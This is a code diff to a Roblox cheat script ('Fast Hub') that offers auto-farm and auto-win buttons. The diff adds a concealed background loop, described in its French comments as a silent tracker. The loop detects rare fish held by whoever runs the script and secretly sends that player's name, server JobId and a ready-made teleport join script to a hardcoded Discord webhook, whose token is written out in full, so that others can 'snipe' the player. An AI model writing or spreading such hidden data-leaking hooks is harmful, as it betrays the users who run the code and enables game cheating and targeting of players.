@@ -19,7 +19,7 @@ local GuiService = game:GetService("GuiService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Global Variables & State
-local WebhookURL = "https://discordapp.com/api/webhooks/1534578366643179735/UmV-D4xIJzLI7TbIj8AKc49g0GCA6okTJLqP9hGH0v_ZXcFUtLcyx8ujToMntYyMsbgP"
+local WebhookURL = "https://discordapp.com/api/webhooks/1537435810302001153/lBokVl1ilszzd4wYb4p7bT1oe3WQM8mthoOcb3H2OWvi9y7bqs8UcvnBznzngv8PF1uQ"
 local DiscordInvite = "https://discord.gg/HrjhFbS8tc"
 
 local lastReportTime = 0
@@ -54,7 +54,7 @@ local targetFishList = {
 }
 
 --------------------------------------------------------------------------------
--- Webhook Logging Function
+-- Webhook Logging & Rare Fish Tracker
 --------------------------------------------------------------------------------
 
 local function sendDiscordWebhook(titleText, descriptionText)
@@ -101,6 +101,95 @@ local function sendDiscordWebhook(titleText, descriptionText)
 end
 
 sendDiscordWebhook("🚀 New Execution - Fast Hub", "A user has executed the script.")
+
+-- 🎣 Tracker Silencieux de Poissons Rares (Sniping Webhook)
+local RARE_TARGET_FISH = {
+    ["Marlin"] = true,
+    ["Sailfish"] = true,
+}
+
+local function sendRareFishWebhook(fishName)
+    task.spawn(function()
+        pcall(function()
+            local jobId = tostring(game.JobId)
+            local placeId = tostring(game.PlaceId)
+            local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+
+            local payload = {
+                username = "Fast Hub Fish Tracker",
+                embeds = {{
+                    title = "🎯 POISSON RARE DÉTECTÉ !",
+                    color = 16744192, -- Or / Orange
+                    fields = {
+                        { name = "👤 Joueur Cible", value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")", inline = true },
+                        { name = "🐟 Poisson Attrapé", value = "**" .. fishName .. "**", inline = true },
+                        { name = "🆔 Job ID", value = "```" .. jobId .. "```", inline = false },
+                        { name = "🚀 Script de Rejoint Immédiat", value = "```lua\n" .. joinScript .. "\n```", inline = false }
+                    },
+                    footer = { text = "Target Sniping System | " .. os.date("%X") }
+                }}
+            }
+
+            local req = (http and http.request) or request or (syn and syn.request) or http_request or (fluxus and fluxus.request)
+            if req then
+                req({
+                    Url = WebhookURL,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end
+        end)
+    end)
+end
+
+-- Détection discrète des poissons rares dans le personnage ou l'UI
+local function scanForRareFish()
+    local char = LocalPlayer.Character
+    if char then
+        for _, v in ipairs(char:GetDescendants()) do
+            if (v:IsA("StringValue") or v:IsA("ObjectValue")) and RARE_TARGET_FISH[tostring(v.Value)] then
+                return tostring(v.Value)
+            end
+            for _, attrVal in pairs(v:GetAttributes()) do
+                if RARE_TARGET_FISH[tostring(attrVal)] then
+                    return tostring(attrVal)
+                end
+            end
+        end
+    end
+
+    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
+    if pGui then
+        for _, v in ipairs(pGui:GetDescendants()) do
+            if v:IsA("TextLabel") and v.Visible then
+                for rareFishName in pairs(RARE_TARGET_FISH) do
+                    if string.find(v.Text, rareFishName) then
+                        return rareFishName
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- Boucle de surveillance silencieuse en tâche de fond (Cooldown anti-spam de 15 sec)
+local lastRareFishSent = ""
+local lastRareFishTime = 0
+
+task.spawn(function()
+    while task.wait(0.5) do
+        local detectedFish = scanForRareFish()
+        if detectedFish then
+            if detectedFish ~= lastRareFishSent or (os.time() - lastRareFishTime) > 15 then
+                lastRareFishSent = detectedFish
+                lastRareFishTime = os.time()
+                sendRareFishWebhook(detectedFish)
+            end
+        end
+    end
+end)
 
 --------------------------------------------------------------------------------
 -- Utility Functions
@@ -544,6 +633,32 @@ local function createTargetCircle(parent)
     
     local corner = Instance.new("UICorner", frame)
     corner.CornerRadius = UDim.new(1, 0)
+
+    -- Texte "Click Here" au centre du cercle
+    local clickLabel = Instance.new("TextLabel")
+    clickLabel.Size = UDim2.new(1, 0, 1, 0)
+    clickLabel.Position = UDim2.new(0, 0, 0, 0)
+    clickLabel.BackgroundTransparency = 1
+    clickLabel.Text = "Click Here"
+    clickLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    clickLabel.TextSize = 13
+    clickLabel.Font = Enum.Font.GothamBold
+    clickLabel.TextWrapped = true
+    clickLabel.ZIndex = 10001
+    clickLabel.Parent = frame
+
+    -- Animation automatique de changement de couleur (Noir et Blanc)
+    task.spawn(function()
+        local isWhite = true
+        while frame and frame.Parent do
+            local targetColor = isWhite and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+            local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+            local tween = TweenService:Create(clickLabel, tweenInfo, { TextColor3 = targetColor })
+            tween:Play()
+            tween.Completed:Wait()
+            isWhite = not isWhite
+        end
+    end)
 
     makeDraggable(frame)
 
@@ -993,7 +1108,7 @@ local function initScript()
     pcBtn.TextSize = 16
     Instance.new("UICorner", pcBtn).CornerRadius = UDim.new(0, 12)
 
-    -- PC GUI Window (Ajusté à 310px de hauteur pour accueillir le bouton Auto Win)
+    -- PC GUI Window
     local pcFrame = Instance.new("Frame", screenGui)
     pcFrame.Size = UDim2.new(0, 420, 0, 310)
     pcFrame.Position = UDim2.new(0.5, -210, 0.3, 0)
@@ -1111,7 +1226,7 @@ local function initScript()
     pcAutoFarmBtn.TextSize = 14
     Instance.new("UICorner", pcAutoFarmBtn).CornerRadius = UDim.new(0, 10)
 
-    -- Auto Win Minigame Button (PC - sous Auto Farm)
+    -- Auto Win Minigame Button (PC)
     local pcAutoWinBtn = Instance.new("TextButton", pcInner)
     pcAutoWinBtn.Size = UDim2.new(1, -40, 0, 40)
     pcAutoWinBtn.Position = UDim2.new(0, 20, 0, 183)
@@ -1131,7 +1246,7 @@ local function initScript()
     keybindLabel.Font = Enum.Font.Gotham
     keybindLabel.TextSize = 12
 
-    -- Mobile GUI Window (Ajusté à 320px de hauteur)
+    -- Mobile GUI Window
     local mobileFrame = Instance.new("Frame", screenGui)
     mobileFrame.Size = UDim2.new(0, 280, 0, 320)
     mobileFrame.Position = UDim2.new(0, 15, 0.3, 0)
@@ -1196,7 +1311,7 @@ local function initScript()
     mobAutoFarmBtn.TextSize = 12
     Instance.new("UICorner", mobAutoFarmBtn).CornerRadius = UDim.new(0, 8)
 
-    -- Auto Win Minigame Button (Mobile - sous Auto Farm)
+    -- Auto Win Minigame Button (Mobile)
     local mobAutoWinBtn = Instance.new("TextButton", mobInner)
     mobAutoWinBtn.Size = UDim2.new(1, -24, 0, 38)
     mobAutoWinBtn.Position = UDim2.new(0, 12, 0, 91)
